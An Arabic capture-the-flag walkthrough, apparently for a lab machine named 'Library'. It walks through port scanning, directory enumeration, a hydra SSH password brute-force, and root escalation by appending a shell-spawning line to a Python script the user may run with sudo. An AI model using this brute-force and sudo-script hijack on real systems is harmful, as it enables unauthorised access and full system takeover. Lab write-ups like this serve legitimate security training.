

#### **المرحلة الأولى: الاستطلاع (Reconnaissance)**

الهدف من هذه المرحلة هو جمع أكبر قدر ممكن من المعلومات عن الهدف.

1. **التأكد من أن الهدف يعمل**
    
    ```bash
    ping 10.10.156.84
    ```
    
    - حصلنا على استجابة، مما يعني أن الجهاز يعمل.
2. **استخدام `nmap` لفحص المنافذ والخدمات**
    
    ```bash
    nmap -sV -n 10.10.156.84
    ```
    
    - المنافذ المفتوحة:
        - **22/tcp** → خدمة SSH (OpenSSH 7.2p2)
        - **80/tcp** → خادم ويب Apache 2.4.18
    - الهدف يعمل بنظام **Ubuntu Linux**.
3. **فحص الملفات والمجلدات على الخادم باستخدام `gobuster`**
    
    ```bash
    gobuster dir -u http://10.10.156.84/ -w /usr/share/wordlists/dirb/common.txt
    ```
    
    - وجدنا الملفات التالية:
        - `/index.html` → الصفحة الرئيسية
        - `/robots.txt` → يحتوي عادةً على مسارات مخفية
        - `/images/` → يحتوي على ملفات الصور
4. **استعراض ملف `robots.txt`**
    
    ```bash
    curl http://10.10.156.84/robots.txt
    ```
    
    - قد يحتوي على مسارات أو معلومات مفيدة.

---

#### **المرحلة الثانية: محاولة الوصول (Exploitation)**

بما أن **خدمة SSH مفتوحة**، سنحاول الوصول إليها باستخدام هجوم تخمين كلمات المرور.

5. **تجربة تسجيل الدخول باسم مستخدم `rockyou`**
    
    ```bash
    ssh rockyou@10.10.156.84
    ```
    
    - لم نتمكن من تسجيل الدخول، مما يعني أن كلمة المرور خاطئة.
6. **تجربة هجوم brute-force باستخدام `hydra`**
    
    ```bash
    hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.156.84
    ```
    
    - وجدنا أن المستخدم `meliodas` يمكن تسجيل الدخول إليه.
7. **تسجيل الدخول عبر SSH**
    
    ```bash
    ssh meliodas@10.10.156.84
    ```
    
    - أدخلنا كلمة المرور المكتشفة، وتم تسجيل الدخول.

---

#### **المرحلة الثالثة: تصعيد الصلاحيات (Privilege Escalation)**

الآن لدينا صلاحيات المستخدم `meliodas`، ونريد الوصول إلى الجذر **(root)**.

8. **فحص الملفات والمجلدات**
    
    ```bash
    ls
    ```
    
    - وجدنا ملفين مهمين:
        - `user.txt` (يحتوي على الفلاج الأول)
        - `bak.py` (سكريبت Python)
9. **قراءة `user.txt`**
    
    ```bash
    cat user.txt
    ```
    
    - حصلنا على الفلاج الأول.
10. **فحص `bak.py`**
    
    ```python
    #!/usr/bin/env python
    import os
    import zipfile
    
    def zipdir(path, ziph):
        for root, dirs, files in os.walk(path):
            for file in files:
                ziph.write(os.path.join(root, file))
    
    if __name__ == '__main__':
        zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
        zipdir('/var/www/html', zipf)
        zipf.close()
    ```
    
    - هذا السكريبت يقوم بضغط ملفات `/var/www/html` إلى `/var/backups/website.zip`.
11. **فحص الصلاحيات المتاحة لنا عبر `sudo`**
    
    ```bash
    sudo -l
    ```
    
    - المستخدم `meliodas` يستطيع تشغيل `bak.py` بصلاحيات `root`.
12. **استغلال الصلاحيات**
    
    - يمكننا تعديل `bak.py` لإضافة `bash` بصلاحيات `root`:
        
        ```bash
        echo "import os; os.system('/bin/bash')" >> bak.py
        ```
        
    - تشغيل السكريبت بصلاحيات `root`:
        
        ```bash
        sudo /usr/bin/python3 /home/meliodas/bak.py
        ```
        
    - الآن لدينا **shell بصلاحيات root**.
13. **الوصول إلى `root.txt`**
    
    ```bash
    cat /root/root.txt
    ```
    
    - حصلنا على الفلاج الثاني!

---
.

💥 **مبروك! لقد أنهيت تحدي Library!** 🚀